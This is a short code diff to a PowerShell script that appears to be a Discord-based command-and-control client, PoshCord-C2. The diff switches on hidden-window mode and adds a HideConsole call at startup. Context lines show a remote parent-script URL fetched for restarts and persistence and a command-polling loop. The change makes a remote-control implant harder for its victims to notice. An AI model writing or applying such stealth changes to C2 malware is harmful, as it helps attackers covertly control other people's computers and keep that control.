@@ -38,10 +38,10 @@ $chan = "$ch" # make sure the bot AND webhook can access this channel
 
 $version = "1.3.1" # Check version and update
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $response = $null
 $previouscmd = $null
 $authenticated = 0
-$HideWindow = 0 # HIDE THE WINDOW - Change to 1 to hide the console window
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 
 # Shortened webhook detection
@@ -1032,6 +1032,7 @@ Function Authenticate{
 
 # =================================================================================
 
+HideConsole
 PullMsg
 $previouscmd = $response
 VersionCheck
